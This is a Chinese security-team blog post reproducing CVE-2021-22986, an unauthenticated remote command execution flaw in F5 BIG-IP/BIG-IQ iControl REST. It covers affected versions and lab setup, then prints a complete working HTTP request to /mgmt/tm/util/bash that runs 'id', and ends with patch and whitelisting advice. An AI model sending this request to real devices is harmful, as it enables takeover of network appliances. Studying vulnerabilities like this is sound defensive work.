<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-WScu2pgUjvjEqWKt5f19A)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：****zhang0b****@Timeline Sec  
**

**本文字数：800**

**阅读时长：2～3min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

_F5_ _BIG_-_IP_ 是美国 _F5_ 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。  

**0x02 漏洞概述**  

  

**编号：CVE-2021-22986**  
F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过 iControl REST 接口，构造恶意请求，执行任意系统命令。  

**0x03 影响版本**  

  

F5 BIG-IP 16.0.0-16.0.1

F5 BIG-IP 15.1.0-15.1.2

F5 BIG-IP 14.1.0-14.1.3.1

F5 BIG-IP 13.1.0-13.1.3.5

F5 BIG-IP 12.1.0-12.1.5.2

F5 BIG-IQ 7.1.0-7.1.0.2

F5 BIG-IQ 7.0.0-7.0.0.1

F5 BIG-IQ 6.0.0-6.1.0

**0x04 环境搭建**  

  

流程如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaLND5FRuXPWAGpeVFbVWVUSBZVVmNj7WOflsG2Szko09uP5VFUT7GIa7MGLzNBkbrNlmWsHLicJng/640?wx_fmt=png)  

1、登陆 F5 官网申请测试 license 90 天

```
https://www.f5.com/trials
```

2、按流程注册登陆后获得 license，会发送至注册邮箱  

3、下载漏洞版本镜像  

```
https://downloads.f5.com/esd/product.jsp?sw=BIG-IP&pro=big-ip_v14.x&ver=14.1.2
```

4、下载后使用 Vmware 安装即可

**0x05 漏洞复现**  

  

数据包如下，其中  

```
Authorization: Basic YWRtaW46QVNhc1M=

base64解码值为admin:ASasS

需要注意此处X-F5-Auth-Token值为空
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaLND5FRuXPWAGpeVFbVWVUYQmYYMw5tPNY4fSLTLXQzQtiaxx5gdZRhRVLyGiaJ0nicibwcf1trvf1NQ/640?wx_fmt=png)  

POC:  

```
POST /mgmt/tm/util/bash HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46QVNhc1M=
X-F5-Auth-Token: 
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 41

{"command":"run","utilCmdArgs":"-c id"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaLND5FRuXPWAGpeVFbVWVUiaIoIYbDmydoWj6AFxp9g9w0gvsY7yibqH3oHptFLHCkAGvkKGNcTYQQ/640?wx_fmt=png)

**0x06 修复方式**  

  

1、建议将 F5 BIG-IP / BIG-IQ 升级至安全版本。  

下载地址参考：  

https://support.f5.com/csp/article/K02566623

2、建议利用阿里云安全组功能为 F5 BIG-IP / BIG-IQ 相关管理界面设置白名单，仅对可信地址开放访问。

```
参考链接：
```

http://www.jsdjbh.gov.cn/tgyj/746.htm  

https://www.freebuf.com/vuls/266899.html  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行